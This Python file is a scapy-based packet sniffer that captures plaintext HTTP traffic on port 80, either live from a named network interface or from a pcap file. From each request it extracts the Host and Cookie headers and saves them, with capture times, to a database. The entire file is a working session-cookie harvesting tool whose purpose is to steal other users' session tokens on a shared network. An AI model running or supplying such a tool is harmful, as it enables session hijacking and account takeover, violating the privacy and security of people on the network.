
import datetime
from scapy.all import *
from db import *

host_reg = re.compile("Host: (.*)\r\n")

def cookie_collect(packet):
    #try:
        if packet.haslayer("TCP"):
            try:
                byte_pkt = packet.getlayer("TCP").payload.load.decode()
            except:
                return
            matched = host_reg.findall(byte_pkt)
            if len(matched) != 0:
                cookie_start_idx = byte_pkt.find("Cookie: ")
                if cookie_start_idx != -1:
                    cookie_end_idx = byte_pkt.find("\x0d\x0a", cookie_start_idx)
                    cookie = byte_pkt[cookie_start_idx + 8 : cookie_end_idx]
                    
                    #try:
                    matched_domain = matched[0]
                    captured_time = datetime.datetime.utcnow() + datetime.timedelta( hours=9 )
                    captured_time = captured_time.strftime('%Y-%m-%d %H:%M:%S')
                    session = Session()
                    session.add(CookieList(matched_domain, cookie, captured_time))
                    session.commit()
                    
                    #except:
                    #return
                else:
                    return
    #except:
    #   pass




if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Input Condition 'interface' or 'pcap'")
        print("USAGE : %s Condition - interface or pcap" % sys.argv[0])
        sys.exit()
    if sys.argv[1] == "pcap":
        filename = input("Input File Name : ")
        now_path = os.path.dirname(os.path.abspath(__file__))
        pcap_path = os.path.join(now_path, filename)
        pcap = rdpcap(pcap_path)
        for packet in pcap:
            cookie_collect(packet)
    else:
        # sniff(iface="wlan0", prn=cookie_sniff, filter="tcp port 80 and src host not " + ip)
        sniff(iface=sys.argv[1], prn=cookie_collect, filter="tcp port 80")
